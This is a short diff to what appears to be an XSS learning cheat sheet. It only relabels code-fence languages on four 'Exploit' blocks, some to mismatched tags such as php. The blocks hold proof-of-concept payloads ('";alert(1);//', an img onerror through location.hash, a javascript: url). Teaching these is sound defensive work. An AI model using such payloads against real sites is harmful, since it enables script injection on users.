@@ -53,7 +53,7 @@
 `
 <br><br>
 🎯 Exploit:  
-```html
+```js
 ";alert(1);//
 ```
 <br>
@@ -67,7 +67,7 @@
 `<button onclick="doSomething('PAYLOAD')">`  
 <br>
 🎯 Exploit:  
-```html
+```js
 ');alert(1);//
 ```
 <br>
@@ -81,7 +81,7 @@
 `document.body.innerHTML = location.hash;`  
 <br>
 🎯 Exploit:  
-```html
+```php
 #<img src=x onerror=alert(1)>
 ```
 <br>
@@ -112,6 +112,6 @@
 `  
 <br>
 🎯 Exploit:  
-```html
+```css
 url("javascript:alert(1)")
 ```
